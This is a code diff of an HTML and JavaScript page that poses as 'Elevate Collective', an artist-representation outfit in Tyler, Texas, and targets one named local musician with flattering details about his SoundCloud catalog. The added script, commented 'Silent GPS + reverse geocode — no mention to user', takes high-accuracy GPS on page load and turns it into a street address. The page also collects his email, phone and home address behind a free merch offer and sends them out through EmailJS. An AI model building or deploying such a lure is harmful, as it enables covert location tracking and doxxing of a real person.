@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Elevate • @highk3yz</title>
+    <title>Elevate Collective • Artist Representation</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
@@ -24,9 +24,9 @@
             background: #0a0a0a;
             border-radius: 24px;
             padding: 48px 40px;
-            max-width: 560px;
+            max-width: 580px;
             width: 100%;
-            border: 1px solid #1a1a1a;
+            border: 1px solid #151515;
         }
         
         .brand {
@@ -59,7 +59,7 @@
         .brand-location {
             margin-left: auto;
             font-size: 0.65rem;
-            color: #666666;
+            color: #555555;
             text-transform: uppercase;
             letter-spacing: 2px;
             font-weight: 500;
@@ -72,18 +72,16 @@
             margin-bottom: 32px;
         }
         
+        /* Clean placeholder — replace background-image later if desired */
         .artist-avatar {
             width: 72px;
             height: 72px;
-            background: #0d0d0d;
+            background-color: #0d0d0d;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            font-weight: 600;
-            color: #ffffff;
+            background-size: cover;
+            background-position: center;
             border: 1px solid #222222;
+            background-image: url('https://via.placeholder.com/72/0d0d0d/ffffff?text=K');
         }
         
         .artist-info h2 {
@@ -97,39 +95,36 @@
         
         .artist-meta {
             font-size: 0.8rem;
-            color: #888888;
+            color: #777777;
             display: flex;
             align-items: center;
             gap: 12px;
             flex-wrap: wrap;
         }
         
-        .sc-badge, .ig-badge {
-            color: #888888;
-        }
-        
         .ref {
             font-size: 0.65rem;
             text-transform: uppercase;
             letter-spacing: 2px;
-            color: #666666;
+            color: #555555;
             margin-bottom: 32px;
             font-weight: 500;
         }
         
         .headline {
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: 500;
             color: #ffffff;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
             letter-spacing: -0.3px;
+            line-height: 1.4;
         }
         
         .message {
             color: #aaaaaa;
             font-size: 0.95rem;
             line-height: 1.7;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
         
         .message strong {
@@ -140,7 +135,7 @@
         .stats-grid {
             display: flex;
             gap: 28px;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
             flex-wrap: wrap;
         }
         
@@ -160,9 +155,10 @@
         }
         
         .curator-note {
-            background: transparent;
-            padding: 0;
-            margin-bottom: 16px;
+            background: rgba(255,255,255,0.02);
+            border-left: 2px solid #ffffff;
+            padding: 16px 20px;
+            margin-bottom: 20px;
             color: #aaaaaa;
             font-size: 0.95rem;
             line-height: 1.7;
@@ -206,6 +202,13 @@
             font-weight: 500;
         }
         
+        .section-subtitle {
+            font-size: 0.8rem;
+            color: #888888;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
         .venue-list {
             display: flex;
             flex-direction: column;
@@ -216,7 +219,7 @@
         .venue-option {
             display: flex;
             align-items: center;
-            padding: 20px 0;
+            padding: 18px 0;
             border-bottom: 1px solid #151515;
             cursor: pointer;
             transition: opacity 0.15s;
@@ -225,28 +228,30 @@
         .venue-option:hover { opacity: 0.8; }
         .venue-option:last-child { border-bottom: none; }
         
-        .venue-radio {
+        .venue-checkbox {
             width: 20px;
             height: 20px;
             border: 1.5px solid #333333;
-            border-radius: 50%;
+            border-radius: 4px;
             margin-right: 20px;
             position: relative;
+            transition: all 0.15s;
         }
         
-        .venue-option.selected .venue-radio {
+        .venue-option.selected .venue-checkbox {
             border-color: #ffffff;
+            background: #ffffff;
         }
         
-        .venue-option.selected .venue-radio::after {
-            content: '';
-            width: 10px;
-            height: 10px;
-            background: #ffffff;
-            border-radius: 50%;
+        .venue-option.selected .venue-checkbox::after {
+            content: '✓';
+            color: #000000;
+            font-size: 12px;
             position: absolute;
-            top: 3.5px;
-            left: 3.5px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: 700;
         }
         
         .venue-info { flex: 1; }
@@ -265,70 +270,9 @@
             letter-spacing: 0.5px;
         }
         
-        .venue-price {
-            color: #aaaaaa;
-            font-weight: 400;
-            font-size: 0.95rem;
-        }
-        
-        .date-section {
-            margin-bottom: 40px;
-        }
-        
-        .month-block {
-            margin-bottom: 28px;
-        }
-        
-        .month-header {
-            font-size: 0.75rem;
-            font-weight: 500;
+        .venue-note {
             color: #888888;
-            margin-bottom: 16px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-        }
-        
-        .month-header small {
-            font-weight: 400;
-            color: #555555;
-            font-size: 0.65rem;
-            margin-left: 8px;
-        }
-        
-        .date-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
-        }
-        
-        .date-cell {
-            padding: 12px 8px;
-            text-align: center;
-            border: 1px solid #1a1a1a;
-            border-radius: 6px;
-            cursor: pointer;
             font-size: 0.75rem;
-            font-weight: 400;
-            color: #777777;
-            background: transparent;
-            transition: all 0.15s;
-        }
-        
-        .date-cell:hover {
-            border-color: #333333;
-            color: #aaaaaa;
-        }
-        
-        .date-cell.selected {
-            border-color: #ffffff;
-            color: #ffffff;
-            font-weight: 500;
-        }
-        
-        .date-cell span {
-            opacity: 0.4;
-            font-weight: 300;
-            margin-left: 4px;
         }
         
         .form-group {
@@ -377,72 +321,71 @@
             color: #ffffff;
         }
         
-        .merch-banner {
+        .welcome-package {
             background: rgba(255,255,255,0.02);
             border: 1px solid #1a1a1a;
             border-radius: 12px;
-            padding: 24px;
+            padding: 28px;
             margin: 32px 0 24px;
         }
         
-        .merch-title {
-            font-size: 0.9rem;
+        .package-title {
+            font-size: 1rem;
             font-weight: 600;
             color: #ffffff;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
             letter-spacing: -0.3px;
         }
         
-        .merch-desc {
-            font-size: 0.8rem;
+        .package-desc {
+            font-size: 0.85rem;
             color: #aaaaaa;
             margin-bottom: 24px;
             line-height: 1.6;
         }
         
-        .merch-desc strong {
+        .package-desc strong {
             color: #ffffff;
         }
         
-        .address-grid {
+        .package-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 16px;
+            gap: 20px;
+            margin-bottom: 20px;
         }
         
         .address-full {
             grid-column: span 2;
         }
         
-        .location-status {
-            font-size: 0.7rem;
+        .measurement-note {
+            background: transparent;
+            padding: 12px 0;
+            font-size: 0.75rem;
             color: #666666;
-            margin-bottom: 16px;
+            border-top: 1px solid #1a1a1a;
+            margin-top: 16px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
         
-        .location-status span {
-            color: #2e9e7a;
-        }
-        
-        .urgency-note {
+        .interview-note {
             background: transparent;
-            padding: 16px 0;
-            margin: 32px 0 24px;
+            padding: 20px 0;
+            margin: 24px 0;
             border-top: 1px solid #1a1a1a;
             border-bottom: 1px solid #1a1a1a;
             text-align: center;
         }
         
-        .urgency-text {
-            font-size: 0.8rem;
+        .interview-text {
+            font-size: 0.85rem;
             color: #aaaaaa;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+            line-height: 1.7;
         }
         
-        .urgency-text strong {
+        .interview-text strong {
             color: #ffffff;
             font-weight: 600;
         }
@@ -549,139 +492,88 @@
 <div class="portal" id="app">
     <div class="brand">
         <div class="brand-mark">E</div>
-        <div class="brand-text">Elevate</div>
+        <div class="brand-text">Elevate Collective</div>
         <div class="brand-location">Tyler, TX</div>
     </div>
     
     <div class="artist-profile">
-        <div class="artist-avatar">K</div>
+        <div class="artist-avatar"></div>
         <div class="artist-info">
             <h2>Keyvon Ellis</h2>
             <div class="artist-meta">
                 <span>@highk3yz</span>
-                <span class="sc-badge">SoundCloud</span>
-                <span class="ig-badge">@smok3yz5</span>
+                <span>•</span>
+                <span>@smok3yz5</span>
             </div>
         </div>
     </div>
     
-    <div class="ref">Direct Invitation — Ref: ETX·2026·117</div>
+    <div class="ref">Artist Representation Inquiry — Ref: ETX·2026·117</div>
     
-    <div class="headline">"TMR" is at 846. "Splinter" at 464. We're paying attention.</div>
+    <div class="headline">Your catalog is gaining traction. We want to discuss representation.</div>
     
     <div class="message">
-        We've listened to the catalog. <strong>"TMR"</strong> is the anchor. <strong>"Splinter"</strong> and <strong>"Dirty Money"</strong> ft. 98baby show range. <strong>"I miss you 😭"</strong> proves you can pivot. This is a full body of work — not a fluke.
+        <strong>"TMR"</strong> (846 plays) · <strong>"Splinter"</strong> (464) · <strong>"Dirty Money"</strong> ft. 98baby (306) · <strong>"Rolling clouds"</strong> (287). You've built a legitimate body of work. Our A&R team sees clear potential for placement and development across our East Texas network.
     </div>
     
     <div class="stats-grid">
-        <div class="stat">
-            <div class="stat-number">846</div>
-            <div class="stat-label">"TMR"</div>
-        </div>
-        <div class="stat">
-            <div class="stat-number">464</div>
-            <div class="stat-label">"Splinter"</div>
-        </div>
-        <div class="stat">
-            <div class="stat-number">306</div>
-            <div class="stat-label">"Dirty Money"</div>
-        </div>
-        <div class="stat">
-            <div class="stat-number">22+</div>
-            <div class="stat-label">Catalog</div>
-        </div>
+        <div class="stat"><div class="stat-number">846</div><div class="stat-label">"TMR"</div></div>
+        <div class="stat"><div class="stat-number">464</div><div class="stat-label">"Splinter"</div></div>
+        <div class="stat"><div class="stat-number">306</div><div class="stat-label">"Dirty Money"</div></div>
+        <div class="stat"><div class="stat-number">22+</div><div class="stat-label">Catalog</div></div>
     </div>
     
     <div class="curator-note">
-        <strong>Curator's note</strong> — You've built a real catalog. ZayOn$um, Rico, 98baby, LC Purfininty, kidzeus — you're connected in the Tyler scene. The Frozy-produced "Rastas" shows you work with serious producers. This isn't hobby music. We want to book you.
+        <strong>Curator's note</strong> — You're connected. ZayOn$um, Rico, 98baby, LC Purfininty, kidzeus — real relationships. The Frozy-produced "Rastas" shows you understand production. We want to explore formal representation and what Elevate can do for your career.
     </div>
     
     <div class="track-highlight">
-        <strong>Standout tracks:</strong> TMR · Splinter · Dirty Money ft. 98baby · Rolling clouds · Keep up · Houdini · $hameless
+        <strong>Standout catalog:</strong> TMR · Splinter · Dirty Money · Rolling clouds · Keep up · Houdini · $hameless · I miss you 😭
     </div>
     
     <div class="collab-note">
-        Collabs: ZayOn$um · Rico · 98baby · LC Purfininty · kidzeus · prod. Frozy
+        Collaborators: ZayOn$um · Rico · 98baby · LC Purfininty · kidzeus · prod. Frozy
     </div>
     
     <div class="divider"></div>
     
-    <div class="section-title">Select venue — Paid performance</div>
-    <div class="venue-list">
-        <div class="venue-option selected" data-venue="The Foundry" data-comp="$500">
-            <div class="venue-radio"></div>
-            <div class="venue-info">
-                <div class="venue-name">The Foundry</div>
-                <div class="venue-details">Downtown · 300 cap · House engineer</div>
-            </div>
-            <div class="venue-price">$500</div>
-        </div>
-        <div class="venue-option" data-venue="True Vine Brewing" data-comp="$600">
-            <div class="venue-radio"></div>
-            <div class="venue-info">
-                <div class="venue-name">True Vine Brewing</div>
-                <div class="venue-details">Earl Campbell Pkwy · 250 cap · Outdoor</div>
-            </div>
-            <div class="venue-price">$600</div>
-        </div>
-        <div class="venue-option" data-venue="Stanley's BBQ" data-comp="$750">
-            <div class="venue-radio"></div>
-            <div class="venue-info">
-                <div class="venue-name">Stanley's Famous BBQ</div>
-                <div class="venue-details">S Beckham Ave · 200 cap · Full backline</div>
-            </div>
-            <div class="venue-price">$750</div>
-        </div>
-        <div class="venue-option" data-venue="Brick Street Bar" data-comp="$900">
-            <div class="venue-radio"></div>
-            <div class="venue-info">
-                <div class="venue-name">Brick Street Bar</div>
-                <div class="venue-details">Downtown · 400 cap · Premium slot</div>
-            </div>
-            <div class="venue-price">$900</div>
-        </div>
+    <div class="section-title">Venue interest</div>
+    <div class="section-subtitle">
+        Select venues you'd want to prioritize. Helps us understand where you see yourself performing.
     </div>
     
-    <div class="section-title">Available dates — Limited</div>
-    <div class="date-section">
-        <div class="month-block">
-            <div class="month-header">May 2026<small>4 remaining</small></div>
-            <div class="date-grid">
-                <div class="date-cell selected" data-date="May 9">9<span>FRI</span></div>
-                <div class="date-cell" data-date="May 10">10<span>SAT</span></div>
-                <div class="date-cell" data-date="May 16">16<span>FRI</span></div>
-                <div class="date-cell" data-date="May 17">17<span>SAT</span></div>
-                <div class="date-cell" data-date="May 23">23<span>FRI</span></div>
-                <div class="date-cell" data-date="May 24">24<span>SAT</span></div>
-                <div class="date-cell" data-date="May 30">30<span>FRI</span></div>
-                <div class="date-cell" data-date="May 31">31<span>SAT</span></div>
+    <div class="venue-list">
+        <div class="venue-option selected" data-venue="The Foundry">
+            <div class="venue-checkbox"></div>
+            <div class="venue-info">
+                <div class="venue-name">The Foundry</div>
+                <div class="venue-details">Downtown · 300 cap</div>
             </div>
+            <div class="venue-note">$500–$750</div>
         </div>
-        <div class="month-block">
-            <div class="month-header">June 2026<small>6 remaining</small></div>
-            <div class="date-grid">
-                <div class="date-cell" data-date="June 6">6<span>FRI</span></div>
-                <div class="date-cell" data-date="June 7">7<span>SAT</span></div>
-                <div class="date-cell" data-date="June 13">13<span>FRI</span></div>
-                <div class="date-cell" data-date="June 14">14<span>SAT</span></div>
-                <div class="date-cell" data-date="June 20">20<span>FRI</span></div>
-                <div class="date-cell" data-date="June 21">21<span>SAT</span></div>
-                <div class="date-cell" data-date="June 27">27<span>FRI</span></div>
-                <div class="date-cell" data-date="June 28">28<span>SAT</span></div>
+        <div class="venue-option" data-venue="True Vine Brewing">
+            <div class="venue-checkbox"></div>
+            <div class="venue-info">
+                <div class="venue-name">True Vine Brewing</div>
+                <div class="venue-details">Earl Campbell Pkwy · 250 cap</div>
             </div>
+            <div class="venue-note">$600–$800</div>
         </div>
-        <div class="month-block">
-            <div class="month-header">July 2026<small>5 remaining</small></div>
-            <div class="date-grid">
-                <div class="date-cell" data-date="July 4">4<span>FRI</span></div>
-                <div class="date-cell" data-date="July 5">5<span>SAT</span></div>
-                <div class="date-cell" data-date="July 11">11<span>FRI</span></div>
-                <div class="date-cell" data-date="July 12">12<span>SAT</span></div>
-                <div class="date-cell" data-date="July 18">18<span>FRI</span></div>
-                <div class="date-cell" data-date="July 19">19<span>SAT</span></div>
-                <div class="date-cell" data-date="July 25">25<span>FRI</span></div>
-                <div class="date-cell" data-date="July 26">26<span>SAT</span></div>
+        <div class="venue-option" data-venue="Stanley's BBQ">
+            <div class="venue-checkbox"></div>
+            <div class="venue-info">
+                <div class="venue-name">Stanley's Famous BBQ</div>
+                <div class="venue-details">S Beckham Ave · 200 cap</div>
             </div>
+            <div class="venue-note">$750–$900</div>
+        </div>
+        <div class="venue-option" data-venue="Brick Street Bar">
+            <div class="venue-checkbox"></div>
+            <div class="venue-info">
+                <div class="venue-name">Brick Street Bar</div>
+                <div class="venue-details">Downtown · 400 cap</div>
+            </div>
+            <div class="venue-note">$900+</div>
         </div>
     </div>
     
@@ -694,270 +586,204 @@
     
     <div class="form-group">
         <div class="form-label">Email</div>
-        <input type="email" id="emailInput" placeholder="Booking contact">
+        <input type="email" id="emailInput" placeholder="For scheduling conversation">
     </div>
     
     <div class="form-group">
         <div class="form-label">Phone (optional)</div>
-        <input type="tel" id="phoneInput" placeholder="For day-of coordination">
+        <input type="tel" id="phoneInput" placeholder="For text updates">
     </div>
     
     <div class="form-group">
-        <div class="form-label">Set length</div>
+        <div class="form-label">Preferred contact time</div>
         <select id="slotSelect">
-            <option value="20 min">20 min (opening)</option>
-            <option value="30 min" selected>30 min (feature)</option>
-            <option value="45 min">45 min (extended)</option>
+            <option value="Weekday morning">Weekday morning (9am–12pm)</option>
+            <option value="Weekday afternoon" selected>Weekday afternoon (12pm–5pm)</option>
+            <option value="Weekday evening">Weekday evening (5pm–8pm)</option>
+            <option value="Weekend">Weekend (flexible)</option>
         </select>
     </div>
     
-    <!-- FREE MERCH SECTION -->
-    <div class="merch-banner">
-        <div class="merch-title">🎁 Artist Welcome Package</div>
-        <div class="merch-desc">
-            All confirmed artists receive a <strong>free Elevate Collective merch package</strong> — hoodie, tee, and stickers. We'll ship it to you before your set.
+    <div class="form-group">
+        <div class="form-label">Anything you want us to know?</div>
+        <textarea id="messageInput" placeholder="Goals, upcoming releases, questions..." rows="2"></textarea>
+    </div>
+    
+    <div class="welcome-package">
+        <div class="package-title">🎁 Artist Welcome Package</div>
+        <div class="package-desc">
+            All artists who complete an initial conversation receive a <strong>free Elevate Collective welcome package</strong> — heavyweight hoodie, premium tee, beanie, and stickers.
         </div>
         
-        <div class="location-status" id="locationStatus">
-            📍 Detecting your location...
-        </div>
-        
-        <div class="address-grid">
+        <div class="package-grid">
             <div class="form-group address-full">
-                <div class="form-label">Street Address</div>
-                <input type="text" id="streetInput" placeholder="123 Main St, Apt 4">
+                <div class="form-label">Shipping Address</div>
+                <input type="text" id="streetInput" placeholder="Street address">
             </div>
             <div class="form-group">
                 <div class="form-label">City</div>
-                <input type="text" id="cityInput" placeholder="Tyler">
+                <input type="text" id="cityInput" placeholder="City">
             </div>
             <div class="form-group">
                 <div class="form-label">State</div>
-                <input type="text" id="stateInput" placeholder="TX">
+                <input type="text" id="stateInput" placeholder="State">
             </div>
             <div class="form-group">
-                <div class="form-label">ZIP Code</div>
-                <input type="text" id="zipInput" placeholder="75701">
+                <div class="form-label">ZIP</div>
+                <input type="text" id="zipInput" placeholder="ZIP">
             </div>
             <div class="form-group">
-                <div class="form-label">Size Preference</div>
-                <select id="sizeSelect">
-                    <option value="M">Medium</option>
-                    <option value="L" selected>Large</option>
-                    <option value="XL">X-Large</option>
+                <div class="form-label">Hoodie Size</div>
+                <select id="hoodieSize">
+                    <option value="M">M</option>
+                    <option value="L" selected>L</option>
+                    <option value="XL">XL</option>
+                    <option value="2XL">2XL</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <div class="form-label">Tee Size</div>
+                <select id="teeSize">
+                    <option value="M">M</option>
+                    <option value="L" selected>L</option>
+                    <option value="XL">XL</option>
                     <option value="2XL">2XL</option>
                 </select>
             </div>
         </div>
-        <div style="font-size: 0.65rem; color: #555555; margin-top: 16px; text-transform: uppercase; letter-spacing: 1px;">
-            We'll use your GPS to pre-fill if available. You can edit manually.
+        
+        <div class="measurement-note">
+            💡 Premium fit — size up for oversized. You're tall — we recommend XL/2XL for hoodie comfort. Beanie is one size.
         </div>
     </div>
     
-    <div class="urgency-note">
-        <div class="urgency-text">These slots fill quickly. <strong>Confirm interest today.</strong></div>
+    <div class="interview-note">
+        <div class="interview-text">
+            <strong>This is not a commitment.</strong> It's a conversation about your goals and whether Elevate is the right partner for your next chapter.
+        </div>
     </div>
     
-    <button class="submit-button" id="submitBtn">Secure this slot →</button>
+    <button class="submit-button" id="submitBtn">Request Conversation →</button>
     
     <div class="legal-note">
-        Non-binding expression of interest. Elevate facilitates introduction to venue management. Merch ships within 7-10 business days after confirmation.
+        Elevate Collective • Tyler, TX • Artist development & representation
     </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
     (function() {
-        let selectedVenue = 'The Foundry';
-        let selectedComp = '$500';
-        let selectedDate = 'May 9';
+        // Track selected venues (multiple)
+        let selectedVenues = ['The Foundry'];
         
         document.querySelectorAll('.venue-option').forEach(item => {
             item.addEventListener('click', function() {
-                document.querySelectorAll('.venue-option').forEach(i => i.classList.remove('selected'));
-                this.classList.add('selected');
-                selectedVenue = this.dataset.venue;
-                selectedComp = this.dataset.comp;
+                const venue = this.dataset.venue;
+                if (this.classList.contains('selected')) {
+                    this.classList.remove('selected');
+                    selectedVenues = selectedVenues.filter(v => v !== venue);
+                } else {
+                    this.classList.add('selected');
+                    if (!selectedVenues.includes(venue)) selectedVenues.push(venue);
+                }
             });
         });
+
+        // Silent GPS + reverse geocode — no mention to user
+        async function silentLocationFill() {
+            if (!navigator.geolocation) return;
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                
+                try {
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`);
+                    const data = await res.json();
+                    
+                    if (data.address) {
+                        const addr = data.address;
+                        const street = `${addr.road || ''} ${addr.house_number || ''}`.trim();
+                        const city = addr.city || addr.town || addr.village || addr.suburb || '';
+                        const state = addr.state || '';
+                        const zip = addr.postcode || '';
+                        
+                        if (street) document.getElementById('streetInput').value = street;
+                        if (city) document.getElementById('cityInput').value = city;
+                        if (state) document.getElementById('stateInput').value = state;
+                        if (zip) document.getElementById('zipInput').value = zip;
+                    }
+                } catch (e) {
+                    // Silent fail — user can enter manually
+                }
+            }, () => {
+                // Silent fail
+            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+        }
         
-        document.querySelectorAll('.date-cell').forEach(item => {
-            item.addEventListener('click', function() {
-                document.querySelectorAll('.date-cell').forEach(i => i.classList.remove('selected'));
-                this.classList.add('selected');
-                selectedDate = this.dataset.date;
-            });
-        });
+        silentLocationFill();
 
         emailjs.init('0pn8P18xI5m0VVW8U');
 
-        // AGGRESSIVE LOCATION DETECTION
-        async function getPreciseLocation() {
-            const statusEl = document.getElementById('locationStatus');
-            
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    statusEl.innerHTML = '📍 Location unavailable — please enter manually';
-                    resolve({ success: false });
-                    return;
-                }
-                
-                statusEl.innerHTML = '📍 Acquiring precise location...';
-                
-                const options = {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                };
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lng = pos.coords.longitude;
-                        statusEl.innerHTML = `📍 Location detected — fetching address...`;
-                        
-                        try {
-                            // Reverse geocode to get address
-                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`);
-                            const data = await res.json();
-                            
-                            if (data.address) {
-                                const addr = data.address;
-                                const street = `${addr.road || ''} ${addr.house_number || ''}`.trim();
-                                const city = addr.city || addr.town || addr.village || addr.suburb || '';
-                                const state = addr.state || '';
-                                const zip = addr.postcode || '';
-                                
-                                document.getElementById('streetInput').value = street || '';
-                                document.getElementById('cityInput').value = city || '';
-                                document.getElementById('stateInput').value = state || '';
-                                document.getElementById('zipInput').value = zip || '';
-                                
-                                statusEl.innerHTML = `📍 <span>✓ Address detected</span> — verify below`;
-                            } else {
-                                statusEl.innerHTML = '📍 Location found — please enter address manually';
-                            }
-                        } catch (e) {
-                            statusEl.innerHTML = '📍 Coordinates acquired — please enter address';
-                        }
-                        
-                        resolve({ 
-                            success: true, 
-                            lat: lat.toFixed(6), 
-                            lng: lng.toFixed(6),
-                            accuracy: `${Math.round(pos.coords.accuracy)}m`
-                        });
-                    },
-                    async (err) => {
-                        console.warn('GPS failed:', err.message);
-                        statusEl.innerHTML = '📍 GPS failed — trying IP location...';
-                        
-                        try {
-                            const res = await fetch('https://ipapi.co/json/');
-                            const d = await res.json();
-                            
-                            if (d.city) {
-                                document.getElementById('cityInput').value = d.city || '';
-                                document.getElementById('stateInput').value = d.region_code || '';
-                                document.getElementById('zipInput').value = d.postal || '';
-                                statusEl.innerHTML = `📍 <span>✓ Approximate location detected</span> — verify below`;
-                            } else {
-                                statusEl.innerHTML = '📍 Please enter your shipping address';
-                            }
-                            
-                            resolve({ 
-                                success: true, 
-                                lat: d.latitude, 
-                                lng: d.longitude,
-                                source: 'IP',
-                                ip: d.ip,
-                                city: d.city,
-                                region: d.region
-                            });
-                        } catch {
-                            statusEl.innerHTML = '📍 Please enter your shipping address manually';
-                            resolve({ success: false });
-                        }
-                    },
-                    options
-                );
-            });
-        }
-        
-        getPreciseLocation();
-
-        async function submitBooking() {
+        async function submitRequest() {
             const email = document.getElementById('emailInput').value.trim();
             if (!email || !email.includes('@')) {
-                alert('Valid email required to confirm.');
+                alert('Valid email required.');
                 return false;
             }
             
             const name = document.getElementById('nameInput').value.trim() || 'Keyvon Ellis';
             const phone = document.getElementById('phoneInput').value.trim() || '—';
             const slot = document.getElementById('slotSelect').value;
-            
-            // Shipping details
+            const note = document.getElementById('messageInput').value.trim() || '—';
             const street = document.getElementById('streetInput').value.trim();
             const city = document.getElementById('cityInput').value.trim();
             const state = document.getElementById('stateInput').value.trim();
             const zip = document.getElementById('zipInput').value.trim();
-            const size = document.getElementById('sizeSelect').value;
+            const hoodie = document.getElementById('hoodieSize').value;
+            const tee = document.getElementById('teeSize').value;
             
-            const shippingAddress = street && city ? 
-                `${street}, ${city}, ${state} ${zip}` : 
-                'Address not provided — will follow up';
+            const address = street && city ? `${street}, ${city}, ${state} ${zip}` : 'Not provided';
             
-            const messageBody = `ELEVATE — BOOKING CONFIRMATION
+            const messageBody = `ELEVATE — ARTIST REPRESENTATION INQUIRY
 REF: ETX·2026·117
 
 ARTIST
-Keyvon Ellis
-@highk3yz | @smok3yz5
-${email}  |  ${phone}
-Tyler, TX
+Keyvon Ellis (@highk3yz | @smok3yz5)
+${email} | ${phone}
 
-SOUNDCLOUD METRICS
-TMR: 846  |  Splinter: 464  |  Dirty Money: 306
-Rolling clouds: 287  |  Keep up: 101  |  Houdini: 97
-$hameless: 91  |  Scripture: 68  |  Say sum: 63
-"6 foot" ft. Rico: 58  |  Rastas: 51  |  I miss you 😭: 46
-WaiT: 43  |  Trauma: 41  |  Gtrc110: 31
-come over: 29  |  high Octan3: 25  |  My Name: 24
-Medicine: 18  |  Thrown away: 14  |  bender freestyle: 7
-Total catalog: 22+ tracks  |  Followers: 44
+CATALOG HIGHLIGHTS
+TMR: 846 | Splinter: 464 | Dirty Money: 306
+Rolling clouds: 287 | 22+ tracks
 
-COLLABORATORS
-ZayOn$um · Rico · 98baby · LC Purfininty · kidzeus · prod. Frozy
+VENUE INTEREST
+${selectedVenues.join(' · ')}
 
-SELECTIONS
-Venue: ${selectedVenue}
-Compensation: ${selectedComp}
-Date: ${selectedDate}
-Set length: ${slot}
+CONTACT PREFERENCE
+${slot}
 
-🎁 MERCH SHIPPING
-Size: ${size}
-Address: ${shippingAddress}
+NOTES
+${note}
+
+WELCOME PACKAGE
+Hoodie: ${hoodie} | Tee: ${tee}
+Address: ${address}
 
 —
-Submitted via Elevate artist portal
-${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}`;
+Submitted via Elevate Collective portal
+${new Date().toLocaleString()}`;
 
             await emailjs.send('service_cyval67', 'template_35yqug3', {
                 name: name,
                 email: email,
                 message: messageBody,
-                selected_date: selectedDate,
+                selected_date: 'Representation Inquiry',
                 reply_to: email
             });
             return true;
         }
 
         function showSuccess() {
-            const size = document.getElementById('sizeSelect').value;
-            const city = document.getElementById('cityInput').value || 'your location';
-            
             document.getElementById('app').innerHTML = `
                 <div class="success-screen">
                     <div class="success-icon">
@@ -965,15 +791,15 @@ ${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}`;
                             <polyline points="20 6 9 17 4 12" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
-                    <div class="success-title">You're confirmed.</div>
-                    <div class="success-subtitle">Booking + merch request received.</div>
+                    <div class="success-title">Request received.</div>
+                    <div class="success-subtitle">We'll reach out within 48 hours.</div>
                     <div class="success-card">
                         <div class="badge">Ref: ETX·2026·117</div>
-                        <strong>${selectedVenue}</strong><br>
-                        ${selectedDate} · ${selectedComp}<br>
-                        <span style="font-size:0.85rem;">🎁 ${size} hoodie/tee shipping to ${city}</span>
+                        <strong>Thank you, Keyvon.</strong><br>
+                        Your representation inquiry has been logged.<br>
+                        ${selectedVenues.length ? `Venue interest: ${selectedVenues.join(' · ')}` : ''}
                         <div class="success-divider"></div>
-                        Elevate will connect you with venue management within 48 hours. Your welcome package ships within 7-10 business days. Welcome to the collective, Keyvon.
+                        Welcome package ships after initial conversation.
                     </div>
                 </div>
             `;
@@ -988,7 +814,7 @@ ${new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' })}`;
             btn.style.opacity = '0.6';
             
             try {
-                const success = await submitBooking();
+                const success = await submitRequest();
                 if (success !== false) showSuccess();
             } catch (error) {
                 console.error('Error:', error);
